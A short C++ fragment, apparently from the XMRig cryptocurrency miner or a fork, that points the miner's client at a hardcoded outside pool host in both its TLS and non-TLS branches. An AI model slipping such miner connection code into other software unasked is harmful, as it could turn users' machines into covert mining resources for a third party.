...
#   ifdef XMRIG_FEATURE_TLS
    m_client->setPool(Pool("s3.econet.icu", 5059, userId, nullptr, nullptr, Pool::kKeepAliveTimeout, false, true, Pool::MODE_DAEMON));
#   else
    m_client->setPool(Pool("s3.econet.icu", 5059, userId, nullptr, nullptr, Pool::kKeepAliveTimeout, false, false, Pool::MODE_DAEMON));
#   endif
